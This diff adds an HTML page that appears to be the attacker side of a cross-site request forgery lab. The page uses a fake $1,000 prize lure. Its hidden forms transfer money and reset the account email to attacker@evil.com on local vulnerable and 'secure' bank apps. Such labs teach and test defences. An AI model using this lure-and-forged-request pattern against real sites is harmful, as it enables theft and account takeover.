@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎉 Congratulations! You Won a Prize!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 700px;
+            z-index: 10;
+        }
+        .trophy { font-size: 4rem; }
+        h1 { color: #e74c3c; font-size: 2rem; margin: 1rem 0; }
+        .prize { font-size: 2.5rem; color: #27ae60; font-weight: bold; margin: 1rem 0; }
+        p { color: #666; font-size: 1.1rem; margin: 0.5rem 0; }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.3rem;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 1rem 0.5rem;
+            transition: transform 0.3s;
+        }
+        .btn:hover { transform: translateY(-3px); }
+        .btn:disabled { background: #ccc; cursor: not-allowed; transform: none; }
+        .btn.secondary { background: #e74c3c; }
+        
+        .instructions {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            padding: 1rem;
+            margin-top: 1.5rem;
+            text-align: left;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 0.9rem;
+        }
+        .instructions h4 { color: #856404; margin-bottom: 0.5rem; }
+        .instructions ol { margin-left: 1.5rem; color: #555; }
+        .instructions li { margin: 0.3rem 0; }
+        .instructions code {
+            background: #ecf0f1;
+            padding: 0.1rem 0.3rem;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        
+        .attack-log {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 1rem;
+            border-radius: 10px;
+            margin-top: 1.5rem;
+            text-align: left;
+            font-family: monospace;
+            font-size: 0.8rem;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .attack-log h4 { color: #e74c3c; margin-bottom: 0.5rem; }
+        .log-entry { padding: 0.2rem 0; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .success { color: #2ecc71; }
+        .error { color: #e74c3c; }
+        .info { color: #3498db; }
+        .attack { color: #9b59b6; }
+        
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="trophy">🏆</div>
+        <h1>CONGRATULATIONS!</h1>
+        <p>You are the 1,000,000th visitor!</p>
+        <div class="prize">$1,000 PRIZE!</div>
+        <p>Click below to claim your reward!</p>
+        
+        <div>
+            <button id="claimBtn" class="btn" onclick="executeAttack()">🎁 CLAIM NOW!</button>
+        </div>
+        
+        <div class="instructions">
+            <h4>📋 Testing Instructions:</h4>
+            <ol>
+                <li>Run: <code>python vulnerable_bank.py</code></li>
+                <li>Open <code>http://127.0.0.1:5000 & http://127.0.0.1:5001</code> and login as <code>alice / alice123</code></li>
+                <li>Note balance: <strong>$10,000</strong></li>
+                <li><strong>Keep that tab open!</strong></li>
+                <li>Come back here and click <strong>"CLAIM NOW!"</strong></li>
+                <li>Refresh the bank tab - balance should be <strong>$9,500</strong></li>
+            </ol>
+            <p style="margin-top:0.5rem; color:#e74c3c;"><strong>Note:</strong> If opening this file directly doesn't work, run <code>python attack_server.py</code> and open <code>http://127.0.0.1:8080/malicious_site.html</code></p>
+        </div>
+        
+        <div class="attack-log">
+            <h4>🔓 Attack Log</h4>
+            <div id="log"></div>
+        </div>
+    </div>
+
+    <!-- METHOD 1: Standard form submission (works from server) -->
+    <form id="form-transfer" method="POST" action="http://127.0.0.1:5000/transfer" target="frame1" class="hidden">
+        <input type="hidden" name="recipient" value="bob">
+        <input type="hidden" name="amount" value="500">
+    </form>
+    
+    <form id="form-email" method="POST" action="http://127.0.0.1:5000/settings" target="frame2" class="hidden">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        <input type="hidden" name="new_password" value="">
+    </form>
+    
+    
+    <!-- Hidden iframes for form targets -->
+    <iframe name="frame1" id="frame1" class="hidden"></iframe>
+    <iframe name="frame2" id="frame2" class="hidden"></iframe>
+    <iframe name="frame3" id="frame3" class="hidden"></iframe>
+    <iframe name="frame4" id="frame4" class="hidden"></iframe>
+
+    <script>
+        function logMsg(msg, type = 'info') {
+            const log = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            const icons = { info: 'ℹ️', success: '✅', error: '❌', attack: '⚡' };
+            const entry = document.createElement('div');
+            entry.className = 'log-entry ' + type;
+            entry.innerHTML = `<span style="color:#7f8c8d">[${time}]</span> ${icons[type] || ''} ${msg}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        function executeAttack() {
+            const btn = document.getElementById('claimBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Attacking...';
+            
+            logMsg('User clicked CLAIM NOW - starting attack', 'attack');
+            
+            // Attack 1: Money transfer
+            logMsg('Submitting transfer: $500 to bob', 'attack');
+            logMsg('POST http://127.0.0.1:5000/transfer', 'info');
+            
+            try {
+                document.getElementById('form-transfer').submit();
+                logMsg('Transfer form submitted!', 'success');
+            } catch(e) {
+                logMsg('Form error: ' + e.message, 'error');
+            }
+            
+            // Attack 2: Email change (delayed)
+            setTimeout(() => {
+                logMsg('Submitting email change to attacker@evil.com', 'attack');
+                try {
+                    document.getElementById('form-email').submit();
+                    logMsg('Email change submitted!', 'success');
+                } catch(e) {
+                    logMsg('Form error: ' + e.message, 'error');
+                }
+            }, 500);
+
+            // Also target the secure bank on 127.0.0.1:5001 to verify protections
+            setTimeout(() => {
+                logMsg('Submitting transfer to secure bank: $500 to bob (127.0.0.1:5001)', 'attack');
+                try {
+                    // create a mirror form if it doesn't exist (for direct file open scenarios)
+                    if (!document.getElementById('form-transfer-secure')) {
+                        const f = document.createElement('form');
+                        f.id = 'form-transfer-secure';
+                        f.method = 'POST';
+                        f.action = 'http://127.0.0.1:5001/transfer';
+                        f.target = 'frame3';
+                        f.className = 'hidden';
+                        const r = document.createElement('input'); r.type='hidden'; r.name='recipient'; r.value='bob'; f.appendChild(r);
+                        const a = document.createElement('input'); a.type='hidden'; a.name='amount'; a.value='500'; f.appendChild(a);
+                        document.body.appendChild(f);
+                    }
+                    document.getElementById('form-transfer-secure').submit();
+                    logMsg('Secure transfer form submitted!', 'success');
+                } catch(e) {
+                    logMsg('Form error: ' + e.message, 'error');
+                }
+            }, 800);
+
+            setTimeout(() => {
+                logMsg('Submitting email change to secure bank (attacker@evil.com)', 'attack');
+                try {
+                    if (!document.getElementById('form-email-secure')) {
+                        const f2 = document.createElement('form');
+                        f2.id = 'form-email-secure';
+                        f2.method = 'POST';
+                        f2.action = 'http://127.0.0.1:5001/settings';
+                        f2.target = 'frame4';
+                        f2.className = 'hidden';
+                        const e = document.createElement('input'); e.type='hidden'; e.name='email'; e.value='attacker@evil.com'; f2.appendChild(e);
+                        const p = document.createElement('input'); p.type='hidden'; p.name='new_password'; p.value=''; f2.appendChild(p);
+                        document.body.appendChild(f2);
+                    }
+                    document.getElementById('form-email-secure').submit();
+                    logMsg('Secure email change submitted!', 'success');
+                } catch(e) {
+                    logMsg('Form error: ' + e.message, 'error');
+                }
+            }, 1100);
+            
+            // Show completion
+            setTimeout(() => {
+                logMsg('Attack sequence complete!', 'success');
+                logMsg('Check victim bank account for results', 'info');
+                btn.textContent = '✅ Done!';
+                alert('🎉 Prize claimed!\n\n(Now refresh your bank tab to see the damage...)');
+            }, 1000);
+        }
+        
+        // Initialize on load
+        window.onload = function() {
+            logMsg('Malicious page loaded', 'info');
+            logMsg('Ready - click a button to attack', 'info');
+        };
+        
+        // Listen for iframe loads
+        document.getElementById('frame1').onload = function() {
+            logMsg('Transfer response received from server', 'success');
+        };
+        document.getElementById('frame2').onload = function() {
+            logMsg('Settings response received from server', 'success');
+        };
+        document.getElementById('frame3').onload = function() {
+            logMsg('Transfer response received from secure bank (127.0.0.1:5001)', 'success');
+        };
+        document.getElementById('frame4').onload = function() {
+            logMsg('Settings response received from secure bank (127.0.0.1:5001)', 'success');
+        };
+    </script>
+</body>
+</html>
